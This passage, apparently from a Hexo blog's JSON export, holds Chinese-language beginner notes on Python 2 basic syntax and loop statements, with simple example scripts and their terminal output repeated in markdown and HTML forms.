value:\"</span>, value</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"user input value type:\"</span>, type(value)</div></pre></td></tr></table></figure></p>\n<p>执行实例为：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">input:<span class=\"number\">1</span></div><div class=\"line\">user input value: <span class=\"number\">1</span></div><div class=\"line\">user input value type: &lt;type <span class=\"string\">'str'</span>&gt;</div><div class=\"line\"></div><div class=\"line\">input:a b ef</div><div class=\"line\">user input value: a b ef</div><div class=\"line\">user input value type: &lt;type <span class=\"string\">'str'</span>&gt;</div></pre></td></tr></table></figure></p>\n<h2 id=\"八、多个语句构成代码块\"><a href=\"#八、多个语句构成代码块\" class=\"headerlink\" title=\"八、多个语句构成代码块\"></a>八、多个语句构成代码块</h2><p>像if、while、def和class这样的复合语句，代码块首行以关键字开始，需要以冒号(:)结束。<br>后面的子句使用相同的缩进用以表示同属一个代码块。</p>\n<p>一个代码块结束后建议添加一个空白行使用代码块间界线分明，容易分辨。</p>\n<h2 id=\"九、附录\"><a href=\"#九、附录\" class=\"headerlink\" title=\"九、附录\"></a>九、附录</h2><p>参考文档：<a href=\"http://www.runoob.com/python/python-basic-syntax.html\" target=\"_blank\" rel=\"external\">Python基础语法</a><br>扩展阅读：<a href=\"http://www.runoob.com/python/python-command-line-arguments.html\" target=\"_blank\" rel=\"external\">Python 命令行参数</a></p>\n","excerpt":"<p><img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、第一个Python程序\"><a href=\"#一、第一个Python程序\" class=\"headerlink\" title=\"一、第一个Python程序\"></a>一、第一个Python程序</h2><h3 id=\"1-交互式编程\"><a href=\"#1-交互式编程\" class=\"headerlink\" title=\"1. 交互式编程\"></a>1. 交互式编程</h3><p>在mac或者linux终端输入python命令即可进入交互式编程。如：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:pystudy yeshaoting$ python</div><div class=\"line\">Python <span class=\"number\">2.7</span><span class=\"number\">.10</span> (default, Jul <span class=\"number\">14</span> <span class=\"number\">2015</span>, <span class=\"number\">19</span>:<span class=\"number\">46</span>:<span class=\"number\">27</span>)</div><div class=\"line\">[GCC <span class=\"number\">4.2</span><span class=\"number\">.1</span> Compatible Apple LLVM <span class=\"number\">6.0</span> (clang<span class=\"number\">-600.0</span><span class=\"number\">.39</span>)] on darwin</div><div class=\"line\">Type <span class=\"string\">\"help\"</span>, <span class=\"string\">\"copyright\"</span>, <span class=\"string\">\"credits\"</span> <span class=\"keyword\">or</span> <span class=\"string\">\"license\"</span> <span class=\"keyword\">for</span> more information.</div><div class=\"line\">&gt;&gt;&gt;</div></pre></td></tr></table></figure></p>\n<h3 id=\"2-脚本式编程\"><a href=\"#2-脚本式编程\" class=\"headerlink\" title=\"2. 脚本式编程\"></a>2. 脚本式编程</h3><p>将python代码写入一个以.py为扩展名的python文件，如：test.py。<br>脚本写完后，可以通过如下二种方式执行python脚本：python test.py。</p>\n<p>若python文件里设置了python shebang，则可以通过./test.py来执行。</p>\n<h2 id=\"二、python标识符\"><a href=\"#二、python标识符\" class=\"headerlink\" title=\"二、python标识符\"></a>二、python标识符</h2><blockquote>\n<p>在python里，标识符有字母、数字、下划线组成。所有标识符可以包括英文、数字以及下划线（_），但不能以数字开头。</p>\n<p>python中的标识符是区分大小写的。</p>\n<p>以下划线开头的标识符是有特殊意义的。<br>以单下划线开头（_foo）的代表不能直接访问的类属性，需通过类提供的接口进行访问，不能用“from xxx import *”而导入；<br>以双下划线开头的（__foo）代表类的私有成员；<br>以双下划线开头和结尾的（__foo__）代表python里特殊方法专用的标识，如__init__()代表类的构造函数。</p>\n</blockquote>\n<h2 id=\"三、Python保留字符\"><a href=\"#三、Python保留字符\" class=\"headerlink\" title=\"三、Python保留字符\"></a>三、Python保留字符</h2><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">and</th>\n<th style=\"text-align:center\">exec</th>\n<th style=\"text-align:center\">not</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">assert</td>\n<td style=\"text-align:center\">finally</td>\n<td style=\"text-align:center\">or</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">break</td>\n<td style=\"text-align:center\">for</td>\n<td style=\"text-align:center\">pass</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">class</td>\n<td style=\"text-align:center\">from</td>\n<td style=\"text-align:center\">print</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">continue</td>\n<td style=\"text-align:center\">global</td>\n<td style=\"text-align:center\">raise</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">def</td>\n<td style=\"text-align:center\">if</td>\n<td style=\"text-align:center\">return</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">del</td>\n<td style=\"text-align:center\">import</td>\n<td style=\"text-align:center\">try</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">elif</td>\n<td style=\"text-align:center\">in</td>\n<td style=\"text-align:center\">while</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">else</td>\n<td style=\"text-align:center\">is</td>\n<td style=\"text-align:center\">with</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">except</td>\n<td style=\"text-align:center\">lambda</td>\n<td style=\"text-align:center\">yield</td>\n</tr>\n</tbody>\n</table>","more":"<h2 id=\"四、行和缩进\"><a href=\"#四、行和缩进\" class=\"headerlink\" title=\"四、行和缩进\"></a>四、行和缩进</h2><blockquote>\n<p>学习Python与其他语言最大的区别就是，Python的代码块不使用大括号（{}）来控制类，函数以及其他逻辑判断。python最具特色的就是用缩进来写模块。<br>缩进的空白数量是可变的，但是所有代码块语句必须包含相同的缩进空白数量，这个必须严格执行。<br>IndentationError: unexpected indent 错误是python编译器是在告诉你”Hi，老兄，你的文件里格式不对了，可能是tab和空格没对齐的问题”，所有python对格式要求非常严格。<br>如果是 IndentationError: unindent does not match any outer indentation level错误表明，你使用的缩进方式不一致，有的是 tab 键缩进，有的是空格缩进，改为一致即可。</p>\n</blockquote>\n<p><strong>个人建议</strong>：因为不同的系统、不同的IDE tab缩进设置长度不一，建议使用空格代替tab缩进，能省去一些不必要的麻烦。</p>\n<h2 id=\"五、多行语句\"><a href=\"#五、多行语句\" class=\"headerlink\" title=\"五、多行语句\"></a>五、多行语句</h2><p>语句中包含[], {} 或 () 括号就不需要使用多行连接符。如：python列表、元组、字典定义。<br>而对于语句非如上三类情况，可以在换行处使用斜杆( <strong>\\</strong> )，达到换行目的。例如：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">#!/usr/bin/env python</div><div class=\"line\">#coding=utf8</div><div class=\"line\"></div><div class=\"line\">count = 0</div><div class=\"line\">count = count + 1 \\</div><div class=\"line\">    + 3 + 5;</div><div class=\"line\"></div><div class=\"line\">print &apos;总计：&apos;, count;</div></pre></td></tr></table></figure></p>\n<p>如果行尾未使用斜杆的话，可能会报非法缩进异常：<code>IndentationError: unexpected indent</code>。</p>\n<h2 id=\"五、python引号\"><a href=\"#五、python引号\" class=\"headerlink\" title=\"五、python引号\"></a>五、python引号</h2><p>python里的引号有三种形式：单引号(‘)，双引号(“)以及三引号(‘’’ 或 “””)。<br>其中，单引号和双引号都用于定义一个字符串变量，而三引号可以用来定义一个段落(包含换行)变量。例如：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">paragraph = <span class=\"string\">\"\"\"这是一个段落。</div><div class=\"line\">包含了多个语句\"\"\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">print</span> paragraph</div></pre></td></tr></table></figure></p>\n<p>另外，由于在python里字符串可以单独存在，而不赋值给任何变量。这种形式字符串可以被当作注释使用。例如：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"string\">'''</div><div class=\"line\">Created on Apr 27, 2016</div><div class=\"line\"></div><div class=\"line\">@author: yeshaoting</div><div class=\"line\">'''</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"六、python注释\"><a href=\"#六、python注释\" class=\"headerlink\" title=\"六、python注释\"></a>六、python注释</h2><p>单行注释：<code>#</code><br>多行注释：使用三引号。参见：python引号</p>\n<h2 id=\"七、接收用户输入\"><a href=\"#七、接收用户输入\" class=\"headerlink\" title=\"七、接收用户输入\"></a>七、接收用户输入</h2><p>内建函数：raw_input，用于接收终端用户输入，返回一个字符串。例如：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">value=raw_input(<span class=\"string\">\"input:\"</span>);</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"user input value:\"</span>, value</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"user input value type:\"</span>, type(value)</div></pre></td></tr></table></figure></p>\n<p>执行实例为：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">input:<span class=\"number\">1</span></div><div class=\"line\">user input value: <span class=\"number\">1</span></div><div class=\"line\">user input value type: &lt;type <span class=\"string\">'str'</span>&gt;</div><div class=\"line\"></div><div class=\"line\">input:a b ef</div><div class=\"line\">user input value: a b ef</div><div class=\"line\">user input value type: &lt;type <span class=\"string\">'str'</span>&gt;</div></pre></td></tr></table></figure></p>\n<h2 id=\"八、多个语句构成代码块\"><a href=\"#八、多个语句构成代码块\" class=\"headerlink\" title=\"八、多个语句构成代码块\"></a>八、多个语句构成代码块</h2><p>像if、while、def和class这样的复合语句，代码块首行以关键字开始，需要以冒号(:)结束。<br>后面的子句使用相同的缩进用以表示同属一个代码块。</p>\n<p>一个代码块结束后建议添加一个空白行使用代码块间界线分明，容易分辨。</p>\n<h2 id=\"九、附录\"><a href=\"#九、附录\" class=\"headerlink\" title=\"九、附录\"></a>九、附录</h2><p>参考文档：<a href=\"http://www.runoob.com/python/python-basic-syntax.html\">Python基础语法</a><br>扩展阅读：<a href=\"http://www.runoob.com/python/python-command-line-arguments.html\">Python 命令行参数</a></p>"},{"title":"Python菜鸟教程学习笔记 - 循环语句","_content":"\n<img src=\"/asserts/images/logo/python.png\" title=\"python\" class=\"img-logo img-center\" />\n\n\n## 一、概述\n程序在一般情况下是按顺序执行的。\n编程语言提供了各种控制结构，允许更复杂的执行路径。\n本章要介绍的循环语句，允许我们执行一个语句或语句组多次。\n\n\n### 1. 循环类型\n| 循环类型 | 描述 |\n|---|---|\n| while循环 | 在给定的判断条件为 true 时执行循环体，否则退出循环体。 |\n| for循环 | 重复执行语句 |\n| 嵌套循环\t| 你可以在while循环体中嵌套for循环 |\n\n### 2. 循环控制\n| 控制语句 | 描述 |\n|---|---|\n| break 语句 | 在语句块执行过程中终止循环，并且跳出整个循环。 |\n| continue 语句 | 在语句块执行过程中终止当前循环，跳出该次循环，执行下一次循环。 |\n| pass 语句 | pass是空语句，是为了保持程序结构的完整性。 |\n\n\n## 二、while循环\nPython 编程中 while 语句用于循环执行程序，即在某条件下，循环执行某段程序，以处理需要重复处理的相同任务。\n\n### 1. 语法格式\n> while 判断条件：\n    执行语句……\n\n### 2. 实例\n``` python\n#!/usr/bin/env python\n#coding=utf8\n\ncount = 0;\nwhile count < 9:\n    print 'The count is :', count\n    count = count + 1;\n\nprint \"Good bye!\"\n```\n\n<!-- more -->\n\n### 3. 输出结果\n``` bash\nyerba-buena:loop yeshaoting$ python while.py\nThe count is : 0\nThe count is : 1\nThe count is : 2\nThe count is : 3\nThe count is : 4\nThe count is : 5\nThe count is : 6\nThe count is : 7\nThe count is : 8\nGood bye!\n```\n\n\n## 三、for循环\nPython for循环可以遍历任何序列的项目，如一个列表或者一个字符串。\n\n### 1. 语法格式\n> for iterating_var in sequence:\n   statements(s)\n\n### 2. 实例\n``` python\n#!/usr/bin/env python\n#coding=utf8\n\nstring = 'Python'\nfor letter in string:\n    print letter;\n\n\nfor letter in range(len(string)):\n    print letter;\n\n\nfruits = ['apple', 'mango', 'banana']\nfor fruit in fruits:\n    print fruit;\n```\n\n### 3. 扩展知识\n\n#### 内置函数len\n返回序列(string, bytes, tuple, list, range)长度。\n> Return the length (the number of items) of an object. The argument may be a sequence (such as a string, bytes, tuple, list, or range) or a collection (such as a dictionary, set, or frozen set).\n\n#### 内置函数range\nrange返回一个序列的数。\n\n有两种用法：\nrange(stop)\nrange(start, stop[, step])\n\n\n### 4. 输出结果\n``` bash\nyerba-buena:loop yeshaoting$ python for.py\nP\ny\nt\nh\no\nn\n0\n1\n2\n3\n4\n5\napple\nmango\nbanana\n```\n\n\n## 四、嵌套循环\nPython 语言允许在一个循环体里面嵌入另一个循环。\n\n\n## 五、循环控制\nbreak语句用来终止循环语句，即循环条件没有False条件或者序列还没被完全递归完，也会停止执行循环语句。\ncontinue 语句用来告诉Python跳过当前循环的剩余语句，然后继续进行下一轮循环。\npass 不做任何事情，一般用做占位语句。\n\n\n## 六、参考文档\n- [Python 循环语句](http://www.runoob.com//python/python-loops.html)\n- [Python While循环语句](http://www.runoob.com//python/python-while-loop.html)\n- [Python for 循环语句](http://www.runoob.com//python/python-for-loop.html)\n- [Python 循环嵌套](http://www.runoob.com//python/python-nested-loops.html)\n- [Python break 语句](http://www.runoob.com//python/python-break-statement.html)\n- [Python continue  语句](http://www.runoob.com//python/python-continue-statement.html)\n- [Python pass 语句](http://www.runoob.com//python/python-pass-statement.html)","source":"_posts/article/python/Python菜鸟教程学习笔记-循环语句.md","raw":"title: Python菜鸟教程学习笔记 - 循环语句\ntags:\n  - python\n  - 学习笔记\ncategories:\n  - 系统脚本\n---\n\n<img src=\"/asserts/images/logo/python.png\" title=\"python\" class=\"img-logo img-center\" />\n\n\n## 一、概述\n程序在一般情况下是按顺序执行的。\n编程语言提供了各种控制结构，允许更复杂的执行路径。\n本章要介绍的循环语句，允许我们执行一个语句或语句组多次。\n\n\n### 1. 循环类型\n| 循环类型 | 描述 |\n|---|---|\n| while循环 | 在给定的判断条件为 true 时执行循环体，否则退出循环体。 |\n| for循环 | 重复执行语句 |\n| 嵌套循环\t| 你可以在while循环体中嵌套for循环 |\n\n### 2. 循环控制\n| 控制语句 | 描述 |\n|---|---|\n| break 语句 | 在语句块执行过程中终止循环，并且跳出整个循环。 |\n| continue 语句 | 在语句块执行过程中终止当前循环，跳出该次循环，执行下一次循环。 |\n| pass 语句 | pass是空语句，是为了保持程序结构的完整性。 |\n\n\n## 二、while循环\nPython 编程中 while 语句用于循环执行程序，即在某条件下，循环执行某段程序，以处理需要重复处理的相同任务。\n\n### 1. 语法格式\n> while 判断条件：\n    执行语句……\n\n### 2. 实例\n``` python\n#!/usr/bin/env python\n#coding=utf8\n\ncount = 0;\nwhile count < 9:\n    print 'The count is :', count\n    count = count + 1;\n\nprint \"Good bye!\"\n```\n\n<!-- more -->\n\n### 3. 输出结果\n``` bash\nyerba-buena:loop yeshaoting$ python while.py\nThe count is : 0\nThe count is : 1\nThe count is : 2\nThe count is : 3\nThe count is : 4\nThe count is : 5\nThe count is : 6\nThe count is : 7\nThe count is : 8\nGood bye!\n```\n\n\n## 三、for循环\nPython for循环可以遍历任何序列的项目，如一个列表或者一个字符串。\n\n### 1. 语法格式\n> for iterating_var in sequence:\n   statements(s)\n\n### 2. 实例\n``` python\n#!/usr/bin/env python\n#coding=utf8\n\nstring = 'Python'\nfor letter in string:\n    print letter;\n\n\nfor letter in range(len(string)):\n    print letter;\n\n\nfruits = ['apple', 'mango', 'banana']\nfor fruit in fruits:\n    print fruit;\n```\n\n### 3. 扩展知识\n\n#### 内置函数len\n返回序列(string, bytes, tuple, list, range)长度。\n> Return the length (the number of items) of an object. The argument may be a sequence (such as a string, bytes, tuple, list, or range) or a collection (such as a dictionary, set, or frozen set).\n\n#### 内置函数range\nrange返回一个序列的数。\n\n有两种用法：\nrange(stop)\nrange(start, stop[, step])\n\n\n### 4. 输出结果\n``` bash\nyerba-buena:loop yeshaoting$ python for.py\nP\ny\nt\nh\no\nn\n0\n1\n2\n3\n4\n5\napple\nmango\nbanana\n```\n\n\n## 四、嵌套循环\nPython 语言允许在一个循环体里面嵌入另一个循环。\n\n\n## 五、循环控制\nbreak语句用来终止循环语句，即循环条件没有False条件或者序列还没被完全递归完，也会停止执行循环语句。\ncontinue 语句用来告诉Python跳过当前循环的剩余语句，然后继续进行下一轮循环。\npass 不做任何事情，一般用做占位语句。\n\n\n## 六、参考文档\n- [Python 循环语句](http://www.runoob.com//python/python-loops.html)\n- [Python While循环语句](http://www.runoob.com//python/python-while-loop.html)\n- [Python for 循环语句](http://www.runoob.com//python/python-for-loop.html)\n- [Python 循环嵌套](http://www.runoob.com//python/python-nested-loops.html)\n- [Python break 语句](http://www.runoob.com//python/python-break-statement.html)\n- [Python continue  语句](http://www.runoob.com//python/python-continue-statement.html)\n- [Python pass 语句](http://www.runoob.com//python/python-pass-statement.html)","slug":"article/python/Python菜鸟教程学习笔记-循环语句","published":1,"date":"2016-08-20T07:13:48.000Z","updated":"2016-08-20T08:17:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxus006x5nbtxwpssbcl","content":"<p><img src=\"/asserts/images/logo/python.png\" title=\"python\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>程序在一般情况下是按顺序执行的。<br>编程语言提供了各种控制结构，允许更复杂的执行路径。<br>本章要介绍的循环语句，允许我们执行一个语句或语句组多次。</p>\n<h3 id=\"1-循环类型\"><a href=\"#1-循环类型\" class=\"headerlink\" title=\"1. 循环类型\"></a>1. 循环类型</h3><table>\n<thead>\n<tr>\n<th>循环类型</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>while循环</td>\n<td>在给定的判断条件为 true 时执行循环体，否则退出循环体。</td>\n</tr>\n<tr>\n<td>for循环</td>\n<td>重复执行语句</td>\n</tr>\n<tr>\n<td>嵌套循环</td>\n<td>你可以在while循环体中嵌套for循环</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"2-循环控制\"><a href=\"#2-循环控制\" class=\"headerlink\" title=\"2. 循环控制\"></a>2. 循环控制</h3><table>\n<thead>\n<tr>\n<th>控制语句</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>break 语句</td>\n<td>在语句块执行过程中终止循环，并且跳出整个循环。</td>\n</tr>\n<tr>\n<td>continue 语句</td>\n<td>在语句块执行过程中终止当前循环，跳出该次循环，执行下一次循环。</td>\n</tr>\n<tr>\n<td>pass 语句</td>\n<td>pass是空语句，是为了保持程序结构的完整性。</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"二、while循环\"><a href=\"#二、while循环\" class=\"headerlink\" title=\"二、while循环\"></a>二、while循环</h2><p>Python 编程中 while 语句用于循环执行程序，即在某条件下，循环执行某段程序，以处理需要重复处理的相同任务。</p>\n<h3 id=\"1-语法格式\"><a href=\"#1-语法格式\" class=\"headerlink\" title=\"1. 语法格式\"></a>1. 语法格式</h3><blockquote>\n<p>while 判断条件：<br>    执行语句……</p>\n</blockquote>\n<h3 id=\"2-实例\"><a href=\"#2-实例\" class=\"headerlink\" title=\"2. 实例\"></a>2. 实例</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\">#coding=utf8</span></div><div class=\"line\"></div><div class=\"line\">count = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">while</span> count &lt; <span class=\"number\">9</span>:</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'The count is :'</span>, count</div><div class=\"line\">    count = count + <span class=\"number\">1</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"Good bye!\"</span></div></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h3 id=\"3-输出结果\"><a href=\"#3-输出结果\" class=\"headerlink\" title=\"3. 输出结果\"></a>3. 输出结果</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:loop yeshaoting$ python while.py</div><div class=\"line\">The count is : 0</div><div class=\"line\">The count is : 1</div><div class=\"line\">The count is : 2</div><div class=\"line\">The count is : 3</div><div class=\"line\">The count is : 4</div><div class=\"line\">The count is : 5</div><div class=\"line\">The count is : 6</div><div class=\"line\">The count is : 7</div><div class=\"line\">The count is : 8</div><div class=\"line\">Good <span class=\"built_in\">bye</span>!</div></pre></td></tr></table></figure>\n<h2 id=\"三、for循环\"><a href=\"#三、for循环\" class=\"headerlink\" title=\"三、for循环\"></a>三、for循环</h2><p>Python for循环可以遍历任何序列的项目，如一个列表或者一个字符串。</p>\n<h3 id=\"1-语法格式-1\"><a href=\"#1-语法格式-1\" class=\"headerlink\" title=\"1. 语法格式\"></a>1. 语法格式</h3><blockquote>\n<p>for iterating_var in sequence:<br>   statements(s)</p>\n</blockquote>\n<h3 id=\"2-实例-1\"><a href=\"#2-实例-1\" class=\"headerlink\" title=\"2. 实例\"></a>2. 实例</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\">#coding=utf8</span></div><div class=\"line\"></div><div class=\"line\">string = <span class=\"string\">'Python'</span></div><div class=\"line\"><span class=\"keyword\">for</span> letter <span class=\"keyword\">in</span> string:</div><div class=\"line\">    <span class=\"keyword\">print</span> letter;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">for</span> letter <span class=\"keyword\">in</span> range(len(string)):</div><div class=\"line\">    <span class=\"keyword\">print</span> letter;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">fruits = [<span class=\"string\">'apple'</span>, <span class=\"string\">'mango'</span>, <span class=\"string\">'banana'</span>]</div><div class=\"line\"><span class=\"keyword\">for</span> fruit <span class=\"keyword\">in</span> fruits:</div><div class=\"line\">    <span class=\"keyword\">print</span> fruit;</div></pre></td></tr></table></figure>\n<h3 id=\"3-扩展知识\"><a href=\"#3-扩展知识\" class=\"headerlink\" title=\"3. 扩展知识\"></a>3. 扩展知识</h3><h4 id=\"内置函数len\"><a href=\"#内置函数len\" class=\"headerlink\" title=\"内置函数len\"></a>内置函数len</h4><p>返回序列(string, bytes, tuple, list, range)长度。</p>\n<blockquote>\n<p>Return the length (the number of items) of an object. The argument may be a sequence (such as a string, bytes, tuple, list, or range) or a collection (such as a dictionary, set, or frozen set).</p>\n</blockquote>\n<h4 id=\"内置函数range\"><a href=\"#内置函数range\" class=\"headerlink\" title=\"内置函数range\"></a>内置函数range</h4><p>range返回一个序列的数。</p>\n<p>有两种用法：<br>range(stop)<br>range(start, stop[, step])</p>\n<h3 id=\"4-输出结果\"><a href=\"#4-输出结果\" class=\"headerlink\" title=\"4. 输出结果\"></a>4. 输出结果</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:loop yeshaoting$ python for.py</div><div class=\"line\">P</div><div class=\"line\">y</div><div class=\"line\">t</div><div class=\"line\">h</div><div class=\"line\">o</div><div class=\"line\">n</div><div class=\"line\">0</div><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">apple</div><div class=\"line\">mango</div><div class=\"line\">banana</div></pre></td></tr></table></figure>\n<h2 id=\"四、嵌套循环\"><a href=\"#四、嵌套循环\" class=\"headerlink\" title=\"四、嵌套循环\"></a>四、嵌套循环</h2><p>Python 语言允许在一个循环体里面嵌入另一个循环。</p>\n<h2 id=\"五、循环控制\"><a href=\"#五、循环控制\" class=\"headerlink\" title=\"五、循环控制\"></a>五、循环控制</h2><p>break语句用来终止循环语句，即循环条件没有False条件或者序列还没被完全递归完，也会停止执行循环语句。<br>continue 语句用来告诉Python跳过当前循环的剩余语句，然后继续进行下一轮循环。<br>pass 不做任何事情，一般用做占位语句。</p>\n<h2 id=\"六、参考文档\"><a href=\"#六、参考文档\" class=\"headerlink\" title=\"六、参考文档\"></a>六、参考文档</h2><ul>\n<li><a href=\"http://www.runoob.com//python/python-loops.html\" target=\"_blank\" rel=\"external\">Python 循环语句</a></li>\n<li><a href=\"http://www.runoob.com//python/python-while-loop.html\" target=\"_blank\" rel=\"external\">Python While循环语句</a></li>\n<li><a href=\"http://www.runoob.com//python/python-for-loop.html\" target=\"_blank\" rel=\"external\">Python for 循环语句</a></li>\n<li><a href=\"http://www.runoob.com//python/python-nested-loops.html\" target=\"_blank\" rel=\"external\">Python 循环嵌套</a></li>\n<li><a href=\"http://www.runoob.com//python/python-break-statement.html\" target=\"_blank\" rel=\"external\">Python break 语句</a></li>\n<li><a href=\"http://www.runoob.com//python/python-continue-statement.html\" target=\"_blank\" rel=\"external\">Python continue  语句</a></li>\n<li><a href=\"http://www.runoob.com//python/python-pass-statement.html\" target=\"_blank\" rel=\"external\">Python pass 语句</a></li>\n</ul>\n","excerpt":"<p><img src=\"/asserts/images/logo/python.png\" title=\"python\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>程序在一般情况下是按顺序执行的。<br>编程语言提供了各种控制结构，允许更复杂的执行路径。<br>本章要介绍的循环语句，允许我们执行一个语句或语句组多次。</p>\n<h3 id=\"1-循环类型\"><a href=\"#1-循环类型\" class=\"headerlink\" title=\"1. 循环类型\"></a>1. 循环类型</h3><table>\n<thead>\n<tr>\n<th>循环类型</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>while循环</td>\n<td>在给定的判断条件为 true 时执行循环体，否则退出循环体。</td>\n</tr>\n<tr>\n<td>for循环</td>\n<td>重复执行语句</td>\n</tr>\n<tr>\n<td>嵌套循环</td>\n<td>你可以在while循环体中嵌套for循环</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"2-循环控制\"><a href=\"#2-循环控制\" class=\"headerlink\" title=\"2. 循环控制\"></a>2. 循环控制</h3><table>\n<thead>\n<tr>\n<th>控制语句</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>break 语句</td>\n<td>在语句块执行过程中终止循环，并且跳出整个循环。</td>\n</tr>\n<tr>\n<td>continue 语句</td>\n<td>在语句块执行过程中终止当前循环，跳出该次循环，执行下一次循环。</td>\n</tr>\n<tr>\n<td>pass 语句</td>\n<td>pass是空语句，是为了保持程序结构的完整性。</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"二、while循环\"><a href=\"#二、while循环\" class=\"headerlink\" title=\"二、while循环\"></a>二、while循环</h2><p>Python 编程中 while 语句用于循环执行程序，即在某条件下，循环执行某段程序，以处理需要重复处理的相同任务。</p>\n<h3 id=\"1-语法格式\"><a href=\"#1-语法格式\" class=\"headerlink\" title=\"1. 语法格式\"></a>1. 语法格式</h3><blockquote>\n<p>while 判断条件：<br>    执行语句……</p>\n</blockquote>\n<h3 id=\"2-实例\"><a href=\"#2-实例\" class=\"headerlink\" title=\"2. 实例\"></a>2. 实例</h3><figure class=\"highlight python\"><table><tr><td 